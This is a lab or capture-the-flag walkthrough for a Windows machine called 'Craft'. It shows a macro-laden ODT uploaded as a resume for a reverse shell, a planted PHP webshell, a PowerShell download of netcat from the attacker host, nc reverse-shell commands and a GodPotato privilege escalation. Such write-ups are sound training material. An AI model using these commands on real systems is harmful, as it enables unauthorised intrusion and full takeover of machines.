# Craft

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.197.169
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 23:30 +08
Nmap scan report for 192.168.197.169
Host is up (0.18s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

### OpenOffice Macros -> Shell

The HTTP site was a Lorem Ipsum website:

<figure><img src="../../../.gitbook/assets/image (1837).png" alt=""><figcaption></figcaption></figure>

If we scroll down, we can see that there is a file upload for our 'resume'.

<figure><img src="../../../.gitbook/assets/image (3098).png" alt=""><figcaption></figcaption></figure>

I tried to upload an image, and this triggered an error:

<figure><img src="../../../.gitbook/assets/image (686).png" alt=""><figcaption></figcaption></figure>

An ODT file is similar to a Microsoft Word document, which can be created using `libreoffice`. Seeing that we can only upload ODT files, this machine might have a script opening the files and being able to trigger some macros embedded within the file.&#x20;

We can use `msfconsole` to generate this file:

```
msf6 exploit(multi/misc/openoffice_document_macro) > set LHOST tun0
LHOST => 192.168.45.197
msf6 exploit(multi/misc/openoffice_document_macro) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/misc/openoffice_document_macro) > 
[*] Started reverse TCP handler on 192.168.45.197:4444 
[*] Using URL: http://192.168.45.197:8080/HugvG5t95RCfjWq
[*] Server started.
[*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic/Standard
[*] Packaging file: Basic/Standard/Module1.xml
[*] Packaging file: Basic/Standard/script-lb.xml
[*] Packaging file: Basic/script-lc.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
[*] Packaging file: Configurations2/accelerator/current.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/META-INF
[*] Packaging file: META-INF/manifest.xml
[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Thumbnails
[*] Packaging file: Thumbnails/thumbnail.png
[*] Packaging file: content.xml
[*] Packaging file: manifest.rdf
[*] Packaging file: meta.xml
[*] Packaging file: mimetype
[*] Packaging file: settings.xml
[*] Packaging file: styles.xml
[+] msf.odt stored at /home/kali/.msf4/local/msf.odt
```

Afterwards, we can upload this file to the machine and wait for the script to open it:

```
[*] 192.168.197.169  openoffice_document_macro - Sending payload
[*] Command shell session 1 opened (192.168.45.197:5555 -> 192.168.197.169:49737) at 2023-07-05 23:39:11 +0800
msf6 exploit(multi/misc/openoffice_document_macro) > sessions

Active sessions
===============

  Id  Name  Type               Information                    Connection
  --  ----  ----               -----------                    ----------
  1         shell x64/windows  Shell Banner: Microsoft Windo  192.168.45.197:5555 -> 192.16
                               ws [Version 10.0.17763.2029]   8.197.169:49737 (192.168.197.
                               -----                          169)

```

Resume this sesison to drop into our shell:

<figure><img src="../../../.gitbook/assets/image (955).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Apache User Shell

When checking the users present, we can see that there's an `apache` user:

```
 Directory of C:\Users

07/13/2021  03:35 AM    <DIR>          .
07/13/2021  03:35 AM    <DIR>          ..
05/28/2021  03:53 AM    <DIR>          Administrator
02/17/2023  03:36 PM    <DIR>          apache
05/28/2021  03:53 AM    <DIR>          Public
02/17/2023  03:36 PM    <DIR>          thecybergeek
```

The next step might be to get a shell as this user. Since there's a website being hosted on the machine, we can start there. I found that we can write to the webroot folder:

```
 Directory of C:\xampp\htdocs

07/13/2021  03:18 AM    <DIR>          .
07/13/2021  03:18 AM    <DIR>          ..
07/13/2021  03:18 AM    <DIR>          assets
07/13/2021  03:18 AM    <DIR>          css
07/07/2021  10:53 AM             9,635 index.php
07/13/2021  03:18 AM    <DIR>          js
07/07/2021  09:56 AM               835 upload.php
07/05/2023  08:38 AM    <DIR>          uploads
               2 File(s)         10,470 bytes
               6 Dir(s)  10,492,981,248 bytes free

C:\xampp\htdocs>echo hello > hello.txt
echo hello > hello.txt
```

As such, we can drop a `cmd.php` webshell within this file and verify that we have RCE as `apache`:

```
$ curl http://192.168.197.169/cmd.php?cmd=whoami
craft\apache
```

We can then download `nc64.exe` onto the machine and get a shell as `apache`:

{% code overflow="wrap" %}
```
$ curl -G --data-urlencode 'cmd=powershell -c wget 192.168.45.197/nc64.exe -Outfile C:/Windows/Tasks/nc.exe' http://192.168.197.169/cmd.php

$ curl -G --data-urlencode 'cmd=C:/Windows/Tasks/nc.exe -e cmd.exe 192.168.45.197 21' http://192.168.197.169/cmd.php
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (3938).png" alt=""><figcaption></figcaption></figure>

### SeImpersonatePrivilege

This user has the `SeImpersonatePrivilege` enabled:

```
C:\xampp\htdocs>whoami /priv 
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeTcbPrivilege                Act as part of the operating system       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We can use `godpotato.exe` to exploit this:

{% code overflow="wrap" %}
```
C:\Windows\Tasks>.\godpotato.exe -cmd "cmd /c C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.197 21"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2055).png" alt=""><figcaption></figcaption></figure>

Rooted!
